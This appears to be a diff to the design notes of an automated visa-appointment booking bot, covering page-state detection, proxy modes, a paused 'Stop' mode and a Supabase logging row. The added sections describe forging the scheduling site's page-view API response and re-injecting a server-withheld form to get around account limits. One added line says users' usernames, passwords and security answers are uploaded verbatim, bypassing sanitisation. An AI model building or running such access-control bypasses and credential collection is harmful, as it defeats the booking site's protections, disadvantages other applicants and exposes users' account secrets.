@@ -91,6 +91,8 @@ Called from `logCitySelected` in `src/index.ts` — the choke point all OFC sele
 
 Observed live (Oct 15, `?reschedule=true` consular page, account with "ONE rescheduling attempt remaining"): the site can serve the schedule page **skeleton only** — `#main_container` holds just `#error_row` (the warning); `#page_form`, `#post_select`, `#datepicker`, `#time_select`, `#submitbtn` are never emitted. Server-side decision — all page JS still runs (posts + family-members queries fire and return 200) but every jQuery selector no-ops. The warning itself is NOT the cause — the same warning coexists with a fully rendered form on the OFC reschedule page of the same account. The page-view limiter (`schedulePageViews` → `canViewPage:false` → `$('#page_form').remove()`) is a related mechanism but was ruled out in the observed case.
 
+**Update (Oct 28):** the page-view limiter is now fully decoded and countered — `GET /api/v1/page-views/schedule/single-family-schedule-page-views` both increments the counter and returns `{showWarning, canViewPage}`; it is fulfilled locally with a forged `200 {canViewPage:true}` (`src/browser.ts` + mobile equivalents), which keeps the form even on over-limit accounts. The skeleton page is separately countered by **form re-injection** — inject `#page_form` markup then call the page's own `onPageLoad()` (verified live: posts/members/calendar/entries/submit all work). Full mechanism, element contract, and the `hold-pageviews-block.js` live-patch recipe: `docs/page-view-limit.md`.
+
 Handling (`src/index.ts`, `getSuppressedScheduleState` + `handleScheduleFormSuppression`): detect = schedule URL + `readyState complete` + `#main_container` present + `#page_form`/`#post_select` absent + non-empty `#error_row`, double-probed ~2s apart. **Consular stage → consular wire mode** (below); **OFC stage** → one re-entry via home, then Telegram once + 15-min cooldown → re-enter → repeat. Flags reset when a form is detected. **Never rotates IP** — the lock is account-scoped. Wired at the two seams that previously deadlocked: consular monitoring (`!onConsular`) and the OFC health check (`!onOfc`). `detectPageState` returns `'suppressed'` so `resumeFromCurrentPage` hands it back to the caller immediately instead of polling a form that can't render.
 
 ### Consular Wire Mode (`src/consular-wire.ts`)
@@ -196,6 +198,16 @@ The UI's `IP Mode` dropdown (`ui/index.html`) selects `ipMode: 'none' | 'auto' |
 - **Stop**: `gracefulStopForStatic()` kills Chrome + relay, waits for the debug port to close (`waitForPortClosed` in `utils.ts`), respawns Chrome **direct** so the still-open session stays usable. The taskkill /F emergency path cannot be intercepted.
 - **Caveat**: only Chrome traffic is proxied — node-side calls (license, Telegram, Supabase) go direct even in static mode (unlike NordVPN which is machine-wide). Each static profile gets its own egress; Decodo-style ports are sticky sessions (port 10001 = one IP).
 - `test-static-proxy.js` (root, dev tool, needs `npm run build` first) exercises parse → verify → relay → rotate end-to-end.
+
+### Paused-listening Stop mode
+
+UI **Stop is a pause, not a kill** — the core keeps running in listening mode until the user resumes or the browser/launcher closes.
+
+- **Flags**: `.ivac-stop-<id>` consumed by `checkStopSignal()` → sets the persistent `stopRequested` global → every seam calls `pauseForStop(page, config)` → `pauseAndListen`. `.ivac-start-<id>` (written by `startProfile` when `rec.paused`) resumes the loop.
+- **Why `stopRequested` exists**: `checkStopSignal` deletes the flag file on read — a deep consumer (wire loop, recovery sleep) would otherwise swallow the stop entirely. The global survives until the next `checkStopSignal() || stopRequested` loop-top seam.
+- **While paused**: zero page actions — only `page.url()` transitions + `appointments-for-family`/`schedule-consular-appointments-for-family` response listeners + a read-only liveness `page.evaluate(() => 1)` per 2.5s tick. Observed transitions report `ofc_submitted`/`consular_submitted` to Supabase (existing names, `source:'listener'`). Dead page/browser → process exits; `gracefulExit`'s static-mode Chrome relaunch is deliberately skipped (the user closed it on purpose).
+- **UI side**: `stopProfile` only writes the flag — NO taskkill fallback; `startProfile` on a `rec.paused` profile writes the start flag instead of spawning; `[STOPPED]`/`[RESUMED]` log lines drive `rec.paused` + status. `stopAllProfiles` (launcher quit) still hard-kills every process.
+- **Supabase login row**: `upsertLoginEvent` sends `username + password + securityQuestions` VERBATIM — the `raw:true` option bypasses `sanitizePayload` for this one event only. Dedup key = `(username, machine)` via the `upsert_login_event` RPC — if it isn't deployed, the fallback is a blind INSERT (duplicate rows).
 
 ### Telegram OFC Success Notification
 
